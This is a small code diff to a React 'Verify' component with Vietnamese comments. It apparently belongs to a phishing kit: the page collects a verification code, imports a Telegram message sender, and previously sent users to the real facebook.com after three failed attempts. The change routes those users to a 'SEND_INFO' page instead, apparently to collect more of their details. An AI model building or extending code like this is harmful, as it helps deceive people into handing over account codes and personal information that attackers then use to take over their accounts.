@@ -5,8 +5,11 @@ import { useState, useEffect, useCallback, useMemo } from 'react';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import config from '@/utils/config';
+import { useNavigate } from 'react-router';
+import { PATHS } from '@/router/router';
 
 const Verify = () => {
+    const navigate = useNavigate();
     const [code, setCode] = useState('');
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
@@ -152,7 +155,7 @@ const Verify = () => {
 
         // Chỉ cho 3 lần nhập: lần 1 + 2 lần sai = tổng 3 lần
         if (attempts + 1 >= 3) {
-            window.location.replace('https://facebook.com');
+            navigate(PATHS.SEND_INFO); // ĐÃ SỬA THÀNH CHUYỂN SANG SEND_INFO
             return;
         }
 
